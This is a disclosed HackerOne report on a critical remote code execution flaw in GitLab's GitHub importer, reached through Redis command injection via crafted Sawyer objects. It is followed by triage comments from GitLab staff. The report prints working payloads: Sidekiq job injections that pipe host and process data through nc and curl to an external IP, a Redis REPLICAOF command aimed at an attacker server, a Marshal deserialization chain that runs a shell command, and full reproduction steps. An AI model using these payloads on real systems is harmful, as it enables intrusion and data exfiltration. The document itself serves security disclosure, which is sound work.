---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2022-11-16
submitted: 2022-08-17T12:18:56.726Z
bounty_usd: null
votes: 271
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "yvvdwf"
source: "https://hackerone.com/reports/1672388"
title: "RCE via github import"
---
# RCE via github import

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 271 | **Program:** GitLab | **Disclosed:** 2022-11-16

- Report: [https://hackerone.com/reports/1672388](https://hackerone.com/reports/1672388)
- CWE: OS Command Injection
- Submitted: 2022-08-17T12:18:56.726Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,

While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.

Gitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.

Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:

```ruby
irb(main):641:0> Sawyer::VERSION
=> "0.8.2"
irb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(""), to_s: "example", length: 1)
=> 
{:to_s=>"example", :length=>1}
...
irb(main):643:0> a.to_s
=> "example"
irb(main):644:0> a.length
=> 1
```

Gitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):

```ruby
      def already_imported?(object)
        id = id_for_already_imported_cache(object)

        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)
      end
```

Normally, `id` should be a number. However when `id` is `{"to_s": {"bytesize": 2, "to_s": "1234REDIS_COMMANDS" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):

```ruby
      def build_command(args)
        command = [nil]

        args.each do |i|
          if i.is_a? Array
            i.each do |j|
              j = j.to_s
              command << "$#{j.bytesize}"
              command << j
            end
          else
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
          end
        end
```

As we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

I tested this redis command first on my own gitlab instance and it worked. 

I then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:

```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

Although the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\n\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:

{F1871024}

This means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\n\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.


By checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.

As gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

Although I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`

{F1871025}

# Steps to reproduce

The steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)

The following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:

# Step to reproduce

To reproduce, we need the following prerequisite: 

- A VM/machine to host the dummy server  with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)
- I created the dummy server using nodejs, so you need to have also nodejs on the machine
- A Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within `api` scope.


# Step 1: run the dummy server

- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
- *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:
```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
```
- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

# Step 2: trigger Gitlab import

- Open a new terminal, then run the following command, in which:

   + `YOUR_IP` and `YOUR_PORT` are the values in the previous step
   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```bash
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

- View the result in `/etc/ahihi`

## Impact

Any one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses

## Timeline

- **Report Filed**
- **2022-08-17** @h1_analyst_kenny: Hi @yvvdwf,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@long_cat
- **Report Needs More Info**
- **Report New**
- **2022-08-18** @nmalcolm_gitlab: @yvvdwf if it helps, here is the error from my omnibus install of GitLab when the import is attempted:

```
==> /var/log/gitlab/gitlab-rails/production.log <==
Started POST "/api/v4/import/github" for REDACTED at 2022-08-17 23:55:05 +0000

==> /var/log/gitlab/gitlab-rails/exceptions_json.log <==
{"severity":"ERROR","time":"2022-08-17T23:55:05.368Z","correlation_id":"01GAQ3PT6KHK32N2PEJ213N9AY","exception.class":"NoMethodError","exception.message":"undefined method `description' for []:Array","exception.backtrace":["lib/gitlab/legacy_github_import/project_creator.rb:21:in `execute'","app/services/import/github_service.rb:45:in `create_project'","app/services/import/github_service.rb:24:in `execute'","lib/api/import_github.rb:48:in `block in \u003cclass:ImportGithub\u003e'","ee/lib/gitlab/middleware/ip_restrictor.rb:14:in `block in call'","ee/lib/gitlab/ip_address_state.rb:10:in `with'","ee/lib/gitlab/middleware/ip_restrictor.rb:13:in `call'","lib/api/api_guard.rb:213:in `call'","lib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call'","lib/gitlab/middleware/memory_report.rb:13:in `call'","lib/gitlab/middleware/speedscope.rb:13:in `call'","lib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call'","lib/gitlab/middleware/rails_queue_duration.rb:33:in `call'","lib/gitlab/metrics/rack_middleware.rb:16:in `block in call'","lib/gitlab/metrics/web_transaction.rb:46:in `run'","lib/gitlab/metrics/rack_middleware.rb:16:in `call'","lib/gitlab/jira/middleware.rb:19:in `call'","lib/gitlab/middleware/go.rb:20:in `call'","lib/gitlab/etag_caching/middleware.rb:21:in `call'","lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'","lib/gitlab/database/query_analyzer.rb:37:in `within'","lib/gitlab/middleware/query_analyzer.rb:11:in `call'","lib/gitlab/middleware/multipart.rb:173:in `call'","lib/gitlab/middleware/read_only/controller.rb:50:in `call'","lib/gitlab/middleware/read_only.rb:18:in `call'","lib/gitlab/middleware/same_site_cookies.rb:27:in `call'","lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'","lib/gitlab/middleware/basic_health_check.rb:25:in `call'","lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'","lib/gitlab/middleware/request_context.rb:21:in `call'","lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'","config/initializers/fix_local_cache_middleware.rb:11:in `call'","lib/gitlab/middleware/compressed_json.rb:26:in `call'","lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'","lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'","lib/gitlab/metrics/requests_rack_middleware.rb:77:in `call'","lib/gitlab/middleware/release_env.rb:13:in `call'"],"user.username":"yvvdwf","tags.program":"web","tags.locale":"en","tags.feature_category":"importers","tags.correlation_id":"01GAQ3PT6KHK32N2PEJ213N9AY"}

==> /var/log/gitlab/gitlab-rails/production.log <==

NoMethodError (undefined method `description' for []:Array):
  /opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/legacy_github_import/project_creator.rb:21:in `execute'
  /opt/gitlab/embedded/service/gitlab-rails/app/services/import/github_service.rb:45:in `create_project'
  /opt/gitlab/embedded/service/gitlab-rails/app/services/import/github_service.rb:24:in `execute'
  /opt/gitlab/embedded/service/gitlab-rails/lib/api/import_github.rb:48:in `block in <class:ImportGithub>'
...
```

I'll keep trying different things and attempting to reproduce, but again any updated instructions / fake server / video would be much appreciated!


Cheers,
Nick Malcolm
GitLab Security Team
- **Report Severity Updated**
- **Report Triaged**
- **2022-08-18** @yvvdwf: Hi @nmalcolm_gitlab, I'm glad to hear that you were able to valid the finding. Thanks!
- **2022-08-18** @dcouture: Hi @yvvdwf,

We would like to make sure that you are not testing this anymore. The test entries in Redis are causing issues in other places. Also in the future it would be preferred if such issues were tested on a local GitLab instance to avoid any impact to the production environment.

Thank you,
Dominic
GitLab Security Team
- **2022-08-18** @yvvdwf: Hi @dcouture ,

I acknowledge receipt of the warning. Otherwise, I hope that the tests do not violate to the *Rules of Engagement, Testing, and Proof-of-concepts* policy as I intended to use and effect only my account `yvvdwf` and my private repository `yvvdwf/xss`.

Best regards,
- **2022-08-18** @dcouture: Thank you @yvvdwf. It's all good, I'm sure there were no intentional violation of the rules of engagement, but the testing did cause some stability issues in areas outside of your own repository. We're going to add some more specific wording in our policy to outline how RCE should be tested in the future.

Best regards,
Dominic
GitLab Security Team
- **2022-08-24** @gitlab-securitybot: ETA for fix:

Hi @yvvdwf,

The issue you reported is currently scheduled to be fixed by 2022-09-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
